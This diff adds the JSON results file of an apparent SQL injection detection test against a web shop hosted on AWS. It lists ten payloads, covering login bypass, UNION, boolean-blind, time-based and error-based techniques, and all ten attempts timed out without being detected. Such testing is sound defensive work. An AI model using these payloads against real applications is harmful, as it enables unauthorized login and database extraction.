@@ -1,0 +1,205 @@
+{
+  "test_suite": "SQL Injection Detection Analysis",
+  "target_url": "http://13.42.131.156",
+  "aws_region": "eu-west-2",
+  "execution_date": "2026-03-26T04:22:16.914886+00:00",
+  "total_tests": 10,
+  "detection_summary": {
+    "total_tests": 10,
+    "successful_attacks": 0,
+    "detected": 0,
+    "detection_rate_percent": 0.0
+  },
+  "test_results": [
+    {
+      "test_id": "SQL-01",
+      "description": "Authentication Bypass - Boolean-based blind SQLi",
+      "technique": "Boolean-based blind (Auth Bypass)",
+      "endpoint": "/rest/user/login",
+      "payload": "' OR '1'='1'--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/user/login (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50425F0>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:28:35.898749+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 0,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:28:35.898749+00:00"
+    },
+    {
+      "test_id": "SQL-02",
+      "description": "UNION-based SQLi - Data extraction via product search",
+      "technique": "UNION-based",
+      "endpoint": "/api/Products",
+      "payload": "' UNION SELECT null,null,null,null,null,null,null,null,null--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /api/Products?q=%27+UNION+SELECT+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E5042200>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:33:59.477022+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:33:59.477022+00:00"
+    },
+    {
+      "test_id": "SQL-03",
+      "description": "Boolean-based blind SQLi - Product search inference",
+      "technique": "Boolean-based blind",
+      "endpoint": "/rest/products/search",
+      "payload": "' AND '1'='1",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/products/search?q=%27+AND+%271%27%3D%271 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E5041C60>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:39:22.929743+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:39:22.929743+00:00"
+    },
+    {
+      "test_id": "SQL-04",
+      "description": "Time-based blind SQLi - Feedback endpoint delay",
+      "technique": "Time-based blind",
+      "endpoint": "/api/Feedbacks",
+      "payload": "'; SLEEP(5)--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /api/Feedbacks?id=%27%3B+SLEEP%285%29-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50E1090>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:44:45.832870+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:44:45.832870+00:00"
+    },
+    {
+      "test_id": "SQL-05",
+      "description": "Error-based SQLi - Database version disclosure",
+      "technique": "Error-based",
+      "endpoint": "/rest/basket/1",
+      "payload": "' AND 1=CONVERT(int,@@version)--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/basket/1?id=%27+AND+1%3DCONVERT%28int%2C%40%40version%29-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E5042D10>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:50:08.768602+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:50:08.768602+00:00"
+    },
+    {
+      "test_id": "SQL-06",
+      "description": "Authentication Bypass - Tautology-based login bypass",
+      "technique": "Boolean-based blind (Auth Bypass)",
+      "endpoint": "/rest/user/login",
+      "payload": "admin'--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/user/login (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50E2140>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T03:55:32.111627+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T03:55:32.111627+00:00"
+    },
+    {
+      "test_id": "SQL-07",
+      "description": "UNION-based SQLi - Column count enumeration",
+      "technique": "UNION-based",
+      "endpoint": "/rest/products/search",
+      "payload": "' UNION SELECT null,null,null,null,null,null,null,null,null FROM sqlite_master--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/products/search?q=%27+UNION+SELECT+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull+FROM+sqlite_master-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50E28F0>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T04:00:54.998981+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T04:00:54.998981+00:00"
+    },
+    {
+      "test_id": "SQL-08",
+      "description": "Boolean-based blind SQLi - Substring extraction via feedback",
+      "technique": "Boolean-based blind",
+      "endpoint": "/api/Feedbacks",
+      "payload": "test' AND SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),1,1)='C'--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /api/Feedbacks?comment=test%27+AND+SUBSTR%28%28SELECT+sql+FROM+sqlite_master+LIMIT+1%29%2C1%2C1%29%3D%27C%27-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50429E0>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T04:06:18.027729+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T04:06:18.027729+00:00"
+    },
+    {
+      "test_id": "SQL-09",
+      "description": "Time-based blind SQLi - Conditional delay on login",
+      "technique": "Time-based blind",
+      "endpoint": "/rest/user/login",
+      "payload": "' OR 1=1; WAITFOR DELAY '00:00:05'--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/user/login (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50E3850>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T04:11:40.916776+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T04:11:40.916776+00:00"
+    },
+    {
+      "test_id": "SQL-10",
+      "description": "Error-based SQLi - Type coercion on product search",
+      "technique": "Error-based",
+      "endpoint": "/rest/products/search",
+      "payload": "' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS int)--",
+      "attack_executed": false,
+      "attack_details": {
+        "success": false,
+        "error": "HTTPConnectionPool(host='13.42.131.156', port=80): Max retries exceeded with url: /rest/products/search?q=%27+AND+1%3DCAST%28%28SELECT+name+FROM+sqlite_master+LIMIT+1%29+AS+int%29-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001A4E50E2590>, 'Connection to 13.42.131.156 timed out. (connect timeout=10)'))",
+        "attack_time": "2026-03-26T04:17:03.913264+00:00"
+      },
+      "monitoring_duration_minutes": 5,
+      "total_findings": 1,
+      "correlated_findings": 0,
+      "detected": false,
+      "findings": [],
+      "start_time": "2026-03-26T04:17:03.913264+00:00"
+    }
+  ]
+}
